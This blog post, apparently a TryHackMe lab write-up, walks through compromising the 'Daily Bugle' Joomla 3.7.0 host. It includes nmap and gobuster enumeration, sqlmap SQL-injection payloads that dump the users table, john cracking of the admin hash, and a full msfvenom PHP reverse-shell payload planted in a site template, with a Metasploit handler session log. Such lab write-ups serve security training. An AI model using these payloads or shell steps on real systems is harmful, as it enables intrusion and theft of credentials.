---
title: "Daily Bugle Boot2Root Write-Up"
date: 2020-11-27T00:00:00-04:00
author: "Nate Catelli"
tags: ["ctf", "boot2root", "hacking", "writeup", "tryhackme"]
description: "A boot2root writeup of the Daily Bugle host from TryHackMe"
type: "post"
draft: false
---

## Introduction:
The Daily Bugle challenge was exceptionally difficult compared to a few of the other hosts I've attacked in the past. Not specifically for any technical reason but it provided many opportunities to rabbithole if I wasn't dilligent in both thinking about how I looked for information but also in what I documented. I will attempt to call out the points that I really rabbitholed on but I think it will be very difficult to express in written form.

## Environment
The attack takes place on a flat network consisting of the attack host, a freshly-booted Kali Linux livecd, and the the target host. I knew very little about the host prior to the attack other than that there would be two flags on the host, a user and root flag.

## Attack 
Prior to starting initial recon, I opened up a metasploit console and connected it to the msfdb postgres backend to gather any information that I had found into a single point. I also had setup burp suite to run on port 8080 and configured the local CA in Firefox. Finally I installed gobuster and seclists in anticipation of any enumeration I might need to do. I'm looking forward to these being included with Kali though I really only uses them for personal preference reasons.

### Host enumeration
After this initial setup, I started with a SYN, OS and Version scan of the host to attempt to identify at a high level what I was looking at.

```
msf5 > db_nmap -sS -sV -O 10.10.162.223
[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-28 01:45 UTC
[*] Nmap: Nmap scan report for ip-10-10-162.223.eu-west-1.compute.internal (10.10.162.223)
[*] Nmap: Host is up (0.00059s latency).
[*] Nmap: Not shown: 997 closed ports
[*] Nmap: PORT     STATE SERVICE VERSION
[*] Nmap: 22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
[*] Nmap: 80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
[*] Nmap: 3306/tcp open  mysql   MariaDB (unauthorized)
[*] Nmap: MAC Address: 02:72:4F:1F:35:95 (Unknown)
[*] Nmap: Device type: general purpose
[*] Nmap: Running: Linux 3.X
[*] Nmap: OS CPE: cpe:/o:linux:linux_kernel:3
[*] Nmap: OS details: Linux 3.10 - 3.13
[*] Nmap: Network Distance: 1 hop
[*] Nmap: OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 16.23 seconds
```

This scan told me that the target looked to be a linux host, specifically running a 3.10-3.13 kernel. It also told me that, atleast initially, it would look like I was facing a LAMP stack. I figured at this point it would be a good chance to do some happy path clicking around the site.

#### Visiting the Daily Bugle
I opened the site in my browser to what looked like a news-focused blog.

![daily index](/img/daily_bugle_http_index.png)

There wasn't any immediately links available to any sort of admin page, outside of a simple login panel on the homepage. Happy path clicking around the site didn't yield any other information about potential users or even which CMS the site was using as far as I could identify. Without a hint of a username I didn't want to attempt any bruteforce.

At this point, I decided to enumerate directories on the site to see if I could find a directory that would yield more information.

### Enumerating directories on the site
In order to run the directory enumeration, I reached for my favorite enumeration tool and directory wordlist.

```
root@kali:~# gobuster dir -u 'http://10.10.162.223' -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.162.223
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/11/27 21:01:06 Starting gobuster
===============================================================
/images (Status: 301)
/templates (Status: 301)
/media (Status: 301)
/modules (Status: 301)
/bin (Status: 301)
/plugins (Status: 301)
/includes (Status: 301)
/language (Status: 301)
/components (Status: 301)
/cache (Status: 301)
/libraries (Status: 301)
/tmp (Status: 301)
/layouts (Status: 301)
/administrator (Status: 301)
/cli (Status: 301)
===============================================================
2020/11/27 21:01:39 Finished
===============================================================
```

This returned a huge number of useful directories including an `/administrator` page that looked promising. Upon browsing to this page I found a standard admin login page.

![daily administrator page](/img/daily_bugle_http_administrator.png)

However, this alone atleast told me that I was investigating a Joomla blog. I decided to try to identify the version of Joomla which, to my luck, could be accomplished with the `auxiliary/scanner/http/joomla_version` module in metasploit which was able to tell me that it looked like this host was running version `3.7.0`

```
msf5 auxiliary(scanner/http/joomla_version) > run

[*] Server: Apache/2.4.6 (CentOS) PHP/5.6.40
[+] Joomla version: 3.7.0
[*] Scanned 1 of 1 hosts (100% complete)
```

#### Looking for an vulnerability
With a version and CMS in mind I decided to feed the pair into searchsploit to see if anything turned up on exploit-db.

```
root@kali:~# searchsploit -w joomla | grep 3.7.0
Joomla! 3.7.0 - 'com_fields' SQL Injection                                                                               | https://www.exploit-db.com/exploits/42033
```

This yielded a single sql injection vulnerability that abused a parameter in the com_fields component. Specifically this blog called out that this component was vulnerable to both an error-based, time-based and boolean-based blind injection. Further information on the specific vulnerability could be found on the [sucuri blog.](https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html).

### Mapping the database
I decided to try to map out the database to see if I could leak the credentials to the admin panel through one of these injection methods. To start, I ran a `sqlmap` command with the `TEB` techniques for each identified in the vulnerability and the `--dbs` flag to attempt to identify the joomla database. I've truncated some of the output to save space. However it's worth noting that this run took quite a while as it was left intentionally broad to identify more information about the database.

```
msf5 auxiliary(scanner/http/joomla_version) > sqlmap -u "http://10.10.162.223/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" -p 'list[fullordering]' --risk=3 --level=5 --random-agent --proxy http://127.0.0.1:8080 --technique=TEB --dbs
[*] exec: sqlmap -u "http://10.10.162.223/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" -p 'list[fullordering]' --risk=3 --level=5 --random-agent --proxy http://127.0.0.1:8080 --technique=TEB --dbs
 ___ ___[.]_____ ___ ___  {1.4.8#stable}
|_ -| . [)]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:08:05 /2020-11-27/

[21:08:06] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.8) Gecko/2009040312 Gentoo Firefox/3.0.8' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[21:08:07] [INFO] testing connection to the target URL
[21:08:07] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
you have not declared cookie(s), while server wants to set its own ('eaa83fe8b963ab08ce9ab7d4a798de05=m0itckdsrg4...abd2rhmpp7'). Do you want to use those [Y/n] Y
[21:08:10] [INFO] checking if the target is protected by some kind of WAF/IPS
[21:08:10] [INFO] testing if the target URL content is stable
[21:08:10] [INFO] target URL content is stable
[21:08:11] [INFO] heuristic (basic) test shows that GET parameter 'list[fullordering]' might be injectable (possible DBMS: 'MySQL')
[21:08:11] [INFO] testing for SQL injection on GET parameter 'list[fullordering]'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
[21:08:17] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[21:08:17] [WARNING] reflective value(s) found and filtering out
[21:08:29] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
...
[21:22:49] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)'
[21:23:02] [INFO] GET parameter 'list[fullordering]' appears to be 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)' injectable 
GET parameter 'list[fullordering]' is vulnerable. Do you want to keep testing the others (if any)? [y/N]
sqlmap identified the following injection point(s) with a total of 2299 HTTP(s) requests:
---
Parameter: list[fullordering] (GET)
    Type: error-based
    Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 8098 FROM(SELECT COUNT(*),CONCAT(0x71786a6b71,(SELECT (ELT(8098=8098,1))),0x71706b6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 9257 FROM (SELECT(SLEEP(5)))iXhJ)
---
[21:23:24] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[21:23:28] [INFO] fetching database names
[21:23:30] [INFO] retrieved: 'information_schema'
[21:23:31] [INFO] retrieved: 'joomla'
[21:23:32] [INFO] retrieved: 'mysql'
[21:23:33] [INFO] retrieved: 'performance_schema'
[21:23:34] [INFO] retrieved: 'test'
available databases [5]:
[*] information_schema
[*] joomla
[*] mysql
[*] performance_schema
[*] test

[21:23:34] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 2261 times
[21:23:34] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.10.162.223'

[*] ending @ 21:23:34 /2020-11-27/
```

Eventually this both identified a few valid injection techniques which I could use to further refine the sqlmap command. It additionally identified that the joomla database was in fact called `joomla`.

With this in mind, I tried to better map the tables in the joomla database. Again, the output was truncated for space. While this identified many tables. I've included only a few of the most interesting.

```
msf5 auxiliary(scanner/http/joomla_version) > sqlmap -u "http://10.10.162.223/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" -p 'l
ist[fullordering]' --risk=3 --level=5 --random-agent --proxy http://127.0.0.1:8080 --technique=TE --dbms=MySQL -D joomla --tables
[*] exec: sqlmap -u "http://10.10.162.223/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" -p 'list[fullordering]' --risk=3 --level=
5 --random-agent --proxy http://127.0.0.1:8080 --technique=TE --dbms=MySQL -D joomla --tables

        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.4.8#stable}
|_ -| . [)]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:26:25 /2020-11-27/
[21:26:25] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; es) AppleWebKit/419 (KHTML, like Gecko) Safari/419.3' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[21:26:25] [INFO] testing connection to the target URL
[21:26:25] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
you have not declared cookie(s), while server wants to set its own ('eaa83fe8b963ab08ce9ab7d4a798de05=u77g1e9e2sv...580b9vdo65'). Do you want to use those [Y/n] Y    
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: list[fullordering] (GET)                                                                                                                                   
    Type: error-based
    Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 8098 FROM(SELECT COUNT(*),CONCAT(0x71786a6b71,(SELECT (ELT(8098=8098,1))),0x71706b6
271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
    Type: time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 9257 FROM (SELECT(SLEEP(5)))iXhJ)
---
[21:26:28] [INFO] testing MySQL
[21:26:29] [INFO] confirming MySQL
[21:26:29] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[21:26:29] [INFO] fetching tables for database: 'joomla'
[21:26:29] [INFO] retrieved: '#__assets'
[21:26:29] [INFO] retrieved: '#__associations'
[21:26:30] [INFO] retrieved: '#__banner_clients'
[21:26:30] [INFO] retrieved: '#__banner_tracks'
...
| #__user_usergroup_map      |
| #__usergroups              |
| #__users                   |
| #__utf8_conversion         |
| #__viewlevels              |
+----------------------------+

[*] ending @ 21:26:37 /2020-11-27/
```

With a `#__users` table in mind, I decided to attempt to enumerate this table for a valid set of user credentials. But before doing that I needed to try to identify a set of columns for the table to query against. Luckily, the schema for the `users` table for joomla `3.7.0` was easy to come by and I created a wordlist using the column names.

```
root@kali:~/ctf# cat table_schema.txt 
id
name
username
email
password
usertype
block
sendEmail
registerDate
lastvisitDate
activation
params
```

```
msf5 auxiliary(scanner/http/joomla_version) > sqlmap -u "http://10.10.162.223/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" -p 'list[fullordering]' --risk=3 --level=5 --random-agent --proxy http://127.0.0.1:8080 --technique=TE --dbms=MySQL -D joomla -T '#__users' --dumpatexml" -p 'list[fullordering]' --risk=3 --level=5 --random-agent --proxy http://127.0.0.1:8080 --technique=TE --dbms=MySQL -D joomla -T '#__users' --dump
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.4.8#stable}
|_ -| . [)]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
[*] starting @ 21:34:53 /2020-11-27/

[21:34:53] [INFO] testing connection to the target URL
[21:34:54] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
you have not declared cookie(s), while server wants to set its own ('eaa83fe8b963ab08ce9ab7d4a798de05=n9efcr7j772...u0vd4k6dr5'). Do you want to use those [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: list[fullordering] (GET)
    Type: error-based
    Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 8098 FROM(SELECT COUNT(*),CONCAT(0x71786a6b71,(SELECT (ELT(8098=8098,1))),0x71706b6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 9257 FROM (SELECT(SLEEP(5)))iXhJ)
---
[21:34:56] [INFO] testing MySQL
[21:34:56] [INFO] confirming MySQL
[21:34:56] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[21:34:56] [INFO] fetching columns for table '#__users' in database 'joomla'
[21:34:56] [WARNING] unable to retrieve column names for table '#__users' in database 'joomla'
do you want to use common column existence check? [y/N/q]
[21:35:25] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
which common columns (wordlist) file do you want to use?
[1] default '/usr/share/sqlmap/data/txt/common-columns.txt' (press Enter)
[2] custom
> 2
what's the custom common columns file location?
> /root/ctf/table_schema.txt
[21:36:01] [INFO] checking column existence using items from '/root/ctf/table_schema.txt'
[21:36:01] [INFO] adding words used on web page to the check list
please enter number of threads? [Enter for 1 (current)] 4
[21:36:14] [INFO] starting 4 threads
[21:36:15] [INFO] retrieved: id
[21:36:15] [INFO] retrieved: name
[21:36:15] [INFO] retrieved: username
[21:36:15] [INFO] retrieved: email
[21:36:15] [INFO] retrieved: password
[21:36:15] [INFO] retrieved: block
[21:36:16] [INFO] retrieved: sendEmail
[21:36:16] [INFO] retrieved: registerDate
[21:36:16] [INFO] retrieved: lastvisitDate
[21:36:16] [INFO] retrieved: activation
[21:36:16] [INFO] retrieved: params
[21:36:23] [INFO] fetching entries for table '#__users' in database 'joomla'
[21:36:23] [INFO] retrieved: '0'
[21:36:23] [INFO] retrieved: '0'
[21:36:23] [INFO] retrieved: 'jonah@tryhackme.com'
[21:36:23] [INFO] retrieved: '811'
[21:36:23] [INFO] retrieved: '2019-12-15 23:58:06'
[21:36:23] [INFO] retrieved: 'Super User'
[21:36:23] [INFO] retrieved: ''
[21:36:24] [INFO] retrieved: '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm'
[21:36:24] [INFO] retrieved: '2019-12-14 20:43:49'
[21:36:24] [INFO] retrieved: '1'
[21:36:24] [INFO] retrieved: 'jonah'
Database: joomla
Table: #__users
[1 entry]
+-----+------------+-------+---------------------+---------+--------------------------------------------------------------+----------+-----------+------------+---------------------+---------------------+
| id  | name       | block | email               | params  | password                                                     | username | sendEmail | activation | registerDate        | lastvisitDate       |
+-----+------------+-------+---------------------+---------+--------------------------------------------------------------+----------+-----------+------------+---------------------+---------------------+
| 811 | Super User | 0     | jonah@tryhackme.com | <blank> | $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm | jonah    | 1         | 0          | 2019-12-14 20:43:49 | 2019-12-15 23:58:06 |
+-----+------------+-------+---------------------+---------+--------------------------------------------------------------+----------+-----------+------------+---------------------+---------------------+

[21:36:24] [INFO] table 'joomla.`#__users`' dumped to CSV file '/root/.local/share/sqlmap/output/10.10.162.223/dump/joomla/#__users.csv'
[21:36:24] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 93 times
[21:36:24] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.10.162.223'

[*] ending @ 21:36:24 /2020-11-27/
```

This returned what looked like a valid set of credentials including a hash. With this I decided to run the credentials through `john` using the rockyou wordlist to see if I could crack identify the user's password.

### Cracking the hash
I ran `john` with a parallelism of 2 due to my attack host's 2 vcpus and walked away to let this run. Eventually I was lucky to obtain a match.

```
root@kali:~/ctf# john joomla.john --wordlist=/usr/share/wordlists/rockyou.txt --fork=2
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Node numbers 1-2 of 2 (fork)
Press 'q' or Ctrl-C to abort, almost any other key for status
spiderman123     (jonah)
2 1g 0:00:11:10 DONE (2020-11-27 21:52) 0.001491g/s 34.91p/s 34.91c/s 34.91C/s stargatesg1..speciala
1 0g 0:00:12:00 DONE (2020-11-27 21:53) 0g/s 33.61p/s 33.61c/s 33.61C/s hotcake..honey04
Waiting for 1 child to terminate
Use the "--show" option to display all of the cracked passwords reliably
Session completeds
```

![daily bugle admin panel](/img/daily_bugle_http_admin_panel.png)

With these new-found credentials (`jonah:spiderman123`), I was able to get through to the admin panel. I imediately began clicking around to see if I could find a template or module that I could attempt to inject a shell into.

Additionally, prior to starting an attack, I decided to start a wordlist of the credentials I was finding. On my first attempt I neglected to do this which I later found to have caused me a ton of problems.

#### Starting a Wordlist
```
root@kali:~/ctf# mkdir wordlists
root@kali:~/ctf# echo 'spiderman123' > wordlists/dailybugle.txt
```

### Catching a shell
It wasn't long before I found a path to the template page that I could inject a php shell into and I generated a payload using meterpreter.

```
root@kali:~/ctf# msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.182.144 LPORT=4444
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 1114 bytes
/*<?php /**/ error_reporting(0); $ip = '10.10.182.144'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
```

![daily bugle shell injection](/img/daily_bugle_http_shell_in_template.png)

I then opened the index.php template, saved the original contents and copied the shell into the body of the template. Prior to saving and executing I needed to stage up my listener to catch the shell.


```
msf5 auxiliary(scanner/http/joomla_version) > use mexploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.182.144    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf5 exploit(multi/handler) > set payload rephp/meterpreterprete/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > run -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.182.144:4444
```

Additionally after starting a handler, I staged up the `shell_to_meterpreter` post exploit module so that I could quickly migrate the process from an active php session to a longer lived session in case there was a timeout configured on the webserver.

```
msf5 exploit(multi/handler) > search shell_to_meterpreter

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade


msf5 exploit(multi/handler) > use 0
msf5 post(multi/manage/shell_to_meterpreter) > show options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST    10.10.182.144    no        IP of host that will receive the connection from the payload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on.

msf5 post(multi/manage/shell_to_meterpreter) > set SESSION 1
SESSION => 1
```

I then saved the template and refreshed the index page which quickly resulted in a caught shell. Next I executed the post-exploit `shell_to_meterpreter` module to obtain a stabler shell.

```
msf5 post(multi/manage/shell_to_meterpreter) > 
[*] Sending stage (38288 bytes) to 10.10.162.223
[*] Meterpreter session 1 opened (10.10.182.144:4444 -> 10.10.162.223:36010) at 2020-11-27 22:16:22 +0000

msf5 post(multi/manage/shell_to_meterpreter) > run

[!] SESSION may not be compatible with this module.
[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.10.182.144:4433 
[*] Sending stage (980808 bytes) to 10.10.162.223
[*] Meterpreter session 2 opened (10.10.182.144:4433 -> 10.10.162.223:55960) at 2020-11-27 22:16:36 +0000
[*] Command stager progress: 100.00% (773/773 bytes)
[*] Post module execution completed
msf5 post(multi/manage/shell_to_meterpreter) > sessions 

Active sessions
===============

  Id  Name  Type                   Information                                                              Connection
  --  ----  ----                   -----------                                                              ----------
  1         meterpreter php/linux  apache (48) @ dailybugle                                                 10.10.182.144:4444 -> 10.10.162.223:36010 (10.10.162.223)
  2         meterpreter x86/linux  no-user @ dailybugle (uid=48, gid=48, euid=48, egid=48) @ 10.10.162.223  10.10.182.144:4433 -> 10.10.162.223:55960 (10.10.162.223)

msf5 post(multi/manage/shell_to_meterpreter) > sessions 

Active sessions
===============

  Id  Name  Type                   Information                                                              Connection
  --  ----  ----                   -----------                                                              ----------
  1         meterpreter php/linux  apache (48) @ dailybugle                                                 10.10.182.144:4444 -> 10.10.162.223:36010 (10.10.162.223)
  2         meterpreter x86/linux  no-user @ dailybugle (uid=48, gid=48, euid=48, egid=48) @ 10.10.162.223  10.10.182.144:4433 -> 10.10.162.223:55960 (10.10.162.223)

msf5 post(multi/manage/shell_to_meterpreter) > sessions -k 1
[*] Killing the following session(s): 1
[*] Killing session 1
[*] 10.10.162.223 - Meterpreter session 1 closed.
```

Once I had a stabler shell established, I killed the original shell and quickly replaced the exploited template with it's original contents before verifying that I was now able to see the original index page.

![daily bugle restored index](/img/daily_bugle_http_replaced_landing_page.png)

## Summary
